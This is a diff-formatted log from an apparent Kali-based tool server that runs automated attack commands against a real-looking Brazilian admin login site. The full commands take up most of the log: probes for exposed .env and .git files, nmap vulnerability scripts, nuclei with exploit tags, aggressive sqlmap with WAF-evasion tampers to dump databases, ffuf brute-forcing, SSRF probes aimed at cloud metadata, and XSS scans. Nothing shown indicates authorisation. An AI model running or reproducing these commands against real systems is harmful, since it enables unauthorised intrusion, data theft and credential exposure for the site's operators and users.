@@ -1,0 +1,206 @@
+ [exec] subfinder -d admin.vivasorteoficial.com.br -silent -all -recursive -max-depth 3 2>&1 | head -100
+[100.88.86.48] "POST /call/subfinder HTTP/1.1" 200 -
+  [exec] echo "=== INFO DISCLOSURE SCAN: https://admin.vivasorteoficial.com.br/#/login ===" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/.env'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[DOTENV] HTTP $CODE  /.env  BODY:$BODY" || echo "[ - ] $CODE  /.env" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/.env.local'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[DOTENV_LOCAL] HTTP $CODE  /.env.local  BODY:$BODY" || echo "[ - ] $CODE  /.env.local" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/.env.backup'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[DOTENV_BACKUP] HTTP $CODE  /.env.backup  BODY:$BODY" || echo "[ - ] $CODE  /.env.backup" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/.git/config'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[GIT_CONFIG] HTTP $CODE  /.git/config  BODY:$BODY" || echo "[ - ] $CODE  /.git/config" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/.git/HEAD'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[GIT_HEAD] HTTP $CODE  /.git/HEAD  BODY:$BODY" || echo "[ - ] $CODE  /.git/HEAD" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/vendor/composer/installed.json'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[COMPOSER_DEPS] HTTP $CODE  /vendor/composer/installed.json  BODY:$BODY" || echo "[ - ] $CODE  /vendor/composer/installed.json" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/package.json'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[NPM_DEPS] HTTP $CODE  /package.json  BODY:$BODY" || echo "[ - ] $CODE  /package.json" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/package-lock.json'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[NPM_LOCK] HTTP $CODE  /package-lock.json  BODY:$BODY" || echo "[ - ] $CODE  /package-lock.json" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/requirements.txt'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[PY_DEPS] HTTP $CODE  /requirements.txt  BODY:$BODY" || echo "[ - ] $CODE  /requirements.txt" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/pyproject.toml'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[PY_PROJECT] HTTP $CODE  /pyproject.toml  BODY:$BODY" || echo "[ - ] $CODE  /pyproject.toml" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/Pipfile'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[PIPFILE] HTTP $CODE  /Pipfile  BODY:$BODY" || echo "[ - ] $CODE  /Pipfile" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/adminer.php'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[ADMINER] HTTP $CODE  /adminer.php  BODY:$BODY" || echo "[ - ] $CODE  /adminer.php" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/phpmyadmin/'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[PHPMYADMIN] HTTP $CODE  /phpmyadmin/  BODY:$BODY" || echo "[ - ] $CODE  /phpmyadmin/" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/rest/settings'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[N8N_SETTINGS] HTTP $CODE  /rest/settings  BODY:$BODY" || echo "[ - ] $CODE  /rest/settings" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/api/status'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[PORTAINER_STATUS] HTTP $CODE  /api/status  BODY:$BODY" || echo "[ - ] $CODE  /api/status" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/api/users/admin/init'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[PORTAINER_INIT] HTTP $CODE  /api/users/admin/init  BODY:$BODY" || echo "[ - ] $CODE  /api/users/admin/init" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/rest/v1/'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[SUPABASE_SCHEMA] HTTP $CODE  /rest/v1/  BODY:$BODY" || echo "[ - ] $CODE  /rest/v1/" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/app/config/parameters.yml'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[SYMFONY_CONFIG] HTTP $CODE  /app/config/parameters.yml  BODY:$BODY" || echo "[ - ] $CODE  /app/config/parameters.yml" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/var/logs/prod.log'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[SYMFONY_LOGS] HTTP $CODE  /var/logs/prod.log  BODY:$BODY" || echo "[ - ] $CODE  /var/logs/prod.log" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/phpinfo.php'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[PHPINFO] HTTP $CODE  /phpinfo.php  BODY:$BODY" || echo "[ - ] $CODE  /phpinfo.php" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/_debug'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[DEBUG_PANEL] HTTP $CODE  /_debug  BODY:$BODY" || echo "[ - ] $CODE  /_debug" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/actuator'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[SPRING_ACTUATOR] HTTP $CODE  /actuator  BODY:$BODY" || echo "[ - ] $CODE  /actuator" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/graphql'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[GRAPHQL] HTTP $CODE  /graphql  BODY:$BODY" || echo "[ - ] $CODE  /graphql" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/api-docs'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[SWAGGER] HTTP $CODE  /api-docs  BODY:$BODY" || echo "[ - ] $CODE  /api-docs" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/openapi.json'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[OPENAPI] HTTP $CODE  /openapi.json  BODY:$BODY" || echo "[ - ] $CODE  /openapi.json" && CODE=$(curl -sk -o /tmp/_id_body.txt -w "%{http_code}" -m 8 'https://admin.vivasorteoficial.com.br/#/login/swagger-ui.html'); BODY=$(head -c 300 /tmp/_id_body.txt | tr -d "\n"); [ "$CODE" != "404" ] && [ "$CODE" != "000" ] && echo "[SWAGGER_UI] HTTP $CODE  /swagger-ui.html  BODY:$BODY" || echo "[ - ] $CODE  /swagger-ui.html" && echo "=== SOURCE MAP CHECK ==="; BUNDLE=$(curl -sk -m 10 'https://admin.vivasorteoficial.com.br/#/login' | grep -oE "assets/index-[^\"]+\.js" | head -1); [ -n "$BUNDLE" ] && { CODE=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 https://admin.vivasorteoficial.com.br/#/login/"$BUNDLE".map); echo "[SOURCE_MAP] HTTP $CODE  /$BUNDLE.map"; };  2>&1
+[100.88.86.48] "POST /call/info_disclosure HTTP/1.1" 200 -
+  [exec] echo 'https://admin.vivasorteoficial.com.br/#/login' | httpx -status-code -title -tech-detect -cdn -ip -cname -server -ports 80,443,8080,8443,8000,8888,3000,4000,5000,9000,9090 -follow-redirects -random-agent -silent 2>&1 | head -100
+[100.88.86.48] "POST /call/httpx HTTP/1.1" 200 -
+  [exec] nmap -sV -sC --script=http-title,http-headers,http-auth-finder,http-methods,ssl-cert,banner,vuln -p 21,22,23,25,53,80,110,111,135,139,143,389,443,445,465,587,636,993,995,1433,1521,2375,3000,3306,3389,4000,4443,4848,5000,5432,5900,5984,6379,7001,8000,8080,8081,8443,8444,8888,9000,9090,9200,9300,10000,27017 --min-rate 3000 -Pn --open admin.vivasorteoficial.com.br
+[100.88.86.48] "POST /call/nmap HTTP/1.1" 200 -
+[100.88.86.48] "GET /callbacks HTTP/1.1" 200 -
+  [exec] which subfinder 2>/dev/null && echo __OK__ || echo __MISS__
+[100.88.86.48] "POST /call/shell HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('100.88.86.48', 53378)
+Traceback (most recent call last):
+  File "/usr/lib/python3.13/socketserver.py", line 318, in _handle_request_noblock
+    self.process_request(request, client_address)
+    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 349, in process_request
+    self.finish_request(request, client_address)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 362, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+    ~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 766, in __init__
+    self.handle()
+    ~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 447, in handle
+    self.handle_one_request()
+    ~~~~~~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 435, in handle_one_request
+    method()
+    ~~~~~~^^
+  File "/home/kali/kali-mcp-server.py", line 1897, in do_POST
+    self.end_headers()
+    ~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 549, in end_headers
+    self.flush_headers()
+    ~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 553, in flush_headers
+    self.wfile.write(b"".join(self._headers_buffer))
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 845, in write
+    self._sock.sendall(b)
+    ~~~~~~~~~~~~~~~~~~^^^
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+  [exec] which httpx 2>/dev/null && echo __OK__ || echo __MISS__
+[100.88.86.48] "POST /call/shell HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('100.88.86.48', 53379)
+Traceback (most recent call last):
+  File "/usr/lib/python3.13/socketserver.py", line 318, in _handle_request_noblock
+    self.process_request(request, client_address)
+    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 349, in process_request
+    self.finish_request(request, client_address)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 362, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+    ~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 766, in __init__
+    self.handle()
+    ~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 447, in handle
+    self.handle_one_request()
+    ~~~~~~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 435, in handle_one_request
+    method()
+    ~~~~~~^^
+  File "/home/kali/kali-mcp-server.py", line 1897, in do_POST
+    self.end_headers()
+    ~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 549, in end_headers
+    self.flush_headers()
+    ~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 553, in flush_headers
+    self.wfile.write(b"".join(self._headers_buffer))
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 845, in write
+    self._sock.sendall(b)
+    ~~~~~~~~~~~~~~~~~~^^^
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+  [exec] which ghauri 2>/dev/null && echo __OK__ || echo __MISS__
+[100.88.86.48] "POST /call/shell HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('100.88.86.48', 53380)
+Traceback (most recent call last):
+  File "/usr/lib/python3.13/socketserver.py", line 318, in _handle_request_noblock
+    self.process_request(request, client_address)
+    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 349, in process_request
+    self.finish_request(request, client_address)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 362, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+    ~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 766, in __init__
+    self.handle()
+    ~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 447, in handle
+    self.handle_one_request()
+    ~~~~~~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 435, in handle_one_request
+    method()
+    ~~~~~~^^
+  File "/home/kali/kali-mcp-server.py", line 1897, in do_POST
+    self.end_headers()
+    ~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 549, in end_headers
+    self.flush_headers()
+    ~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 553, in flush_headers
+    self.wfile.write(b"".join(self._headers_buffer))
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 845, in write
+    self._sock.sendall(b)
+    ~~~~~~~~~~~~~~~~~~^^^
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+  [exec] which ffuf 2>/dev/null && echo __OK__ || echo __MISS__
+[100.88.86.48] "POST /call/shell HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('100.88.86.48', 53381)
+Traceback (most recent call last):
+  File "/usr/lib/python3.13/socketserver.py", line 318, in _handle_request_noblock
+    self.process_request(request, client_address)
+    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 349, in process_request
+    self.finish_request(request, client_address)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 362, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+    ~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 766, in __init__
+    self.handle()
+    ~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 447, in handle
+    self.handle_one_request()
+    ~~~~~~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 435, in handle_one_request
+    method()
+    ~~~~~~^^
+  File "/home/kali/kali-mcp-server.py", line 1897, in do_POST
+    self.end_headers()
+    ~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 549, in end_headers
+    self.flush_headers()
+    ~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 553, in flush_headers
+    self.wfile.write(b"".join(self._headers_buffer))
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 845, in write
+    self._sock.sendall(b)
+    ~~~~~~~~~~~~~~~~~~^^^
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+  [exec] which aquatone 2>/dev/null && echo __OK__ || echo __MISS__
+[100.88.86.48] "POST /call/shell HTTP/1.1" 200 -
+----------------------------------------
+Exception occurred during processing of request from ('100.88.86.48', 53382)
+Traceback (most recent call last):
+  File "/usr/lib/python3.13/socketserver.py", line 318, in _handle_request_noblock
+    self.process_request(request, client_address)
+    ~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 349, in process_request
+    self.finish_request(request, client_address)
+    ~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 362, in finish_request
+    self.RequestHandlerClass(request, client_address, self)
+    ~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 766, in __init__
+    self.handle()
+    ~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 447, in handle
+    self.handle_one_request()
+    ~~~~~~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 435, in handle_one_request
+    method()
+    ~~~~~~^^
+  File "/home/kali/kali-mcp-server.py", line 1897, in do_POST
+    self.end_headers()
+    ~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 549, in end_headers
+    self.flush_headers()
+    ~~~~~~~~~~~~~~~~~~^^
+  File "/usr/lib/python3.13/http/server.py", line 553, in flush_headers
+    self.wfile.write(b"".join(self._headers_buffer))
+    ~~~~~~~~~~~~~~~~^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  File "/usr/lib/python3.13/socketserver.py", line 845, in write
+    self._sock.sendall(b)
+    ~~~~~~~~~~~~~~~~~~^^^
+BrokenPipeError: [Errno 32] Broken pipe
+----------------------------------------
+  [exec] nuclei -u 'https://admin.vivasorteoficial.com.br/#/login' -tags cves,misconfig,exposure,vulnerabilities,default-logins,takeovers,technologies,headless,file,network -severity critical,high,medium -rl 150 -bs 30 -c 30 -no-color -no-color 2>&1 | head -120
+[100.88.86.48] "POST /call/nuclei HTTP/1.1" 200 -
+  [exec] nuclei -u 'https://admin.vivasorteoficial.com.br/#/login' -tags exploits,cves,vulnerabilities -severity critical,high -rl 50 -no-color -no-color 2>&1 | head -120
+[100.88.86.48] "POST /call/nuclei HTTP/1.1" 200 -
+  [exec] sqlmap -u 'https://admin.vivasorteoficial.com.br/#/login' --batch --dbs --forms --crawl=2 --level=5 --risk=3 --technique=BEUSTQ --tamper=space2comment,charencode,randomcase,between,equaltolike,greatest,modsecurityversioned --random-agent --time-sec=5 --threads=5 --smart 2>&1 | tail -80
+[100.88.86.48] "POST /call/sqlmap HTTP/1.1" 200 -
+  [exec] WL=/usr/share/seclists/Discovery/Web-Content/raft-large-words.txt; [ ! -f "$WL" ] && WL=/usr/share/seclists/Discovery/Web-Content/common.txt; [ ! -f "$WL" ] && WL=/usr/share/wordlists/dirb/common.txt; ffuf -u 'https://admin.vivasorteoficial.com.br/#/login/FUZZ' -w "$WL" -e php,asp,aspx,jsp,txt,bak,old,zip,env,conf,log,json,xml,yaml -mc 200,201,204,301,302,307,403 -fc 404,429 -recursion -recursion-depth 2 -t 50 -timeout 10 -no-color 2>&1 | head -150
+[100.88.86.48] "POST /call/ffuf HTTP/1.1" 200 -
+  [exec] echo "=== SSRF MANUAL PROBES ===" && for PARAM in url redirect next to dest uri path returnTo callback link target; do CODE=$(curl -sk -o /tmp/kgb_ssrf.txt -w "%{http_code}" -m 8 -G "https://admin.vivasorteoficial.com.br/#/login" --data-urlencode "$PARAM=http://169.254.169.254/latest/meta-data/"); BODY=$(head -c 300 /tmp/kgb_ssrf.txt 2>/dev/null); echo "$BODY" | grep -qiE "(ami-id|instance-id|hostname|local-ipv4)" && echo "[SSRF_CLOUD_META] param=$PARAM => AWS metadata!"; done && echo "--- Internal network probe ---" && for PARAM in url redirect uri dest; do for INTERNAL in "http://127.0.0.1:80" "http://localhost:8080" "http://192.168.1.1" "http://10.0.0.1"; do CODE=$(curl -sk -o /dev/null -w "%{http_code}" -m 8 -G "https://admin.vivasorteoficial.com.br/#/login" --data-urlencode "$PARAM=$INTERNAL"); echo "[$CODE] $PARAM=$INTERNAL"; done; done && echo "=== NUCLEI SSRF ===" && nuclei -u "https://admin.vivasorteoficial.com.br/#/login" -tags ssrf -severity critical,high -no-color 2>&1 | head -25
+[100.88.86.48] "POST /call/shell HTTP/1.1" 200 -
+  [exec] nuclei -u 'https://admin.vivasorteoficial.com.br/#/login' -tags xss,headless -severity high,medium,low -rl 50 -no-color -no-color 2>&1 | head -120
+
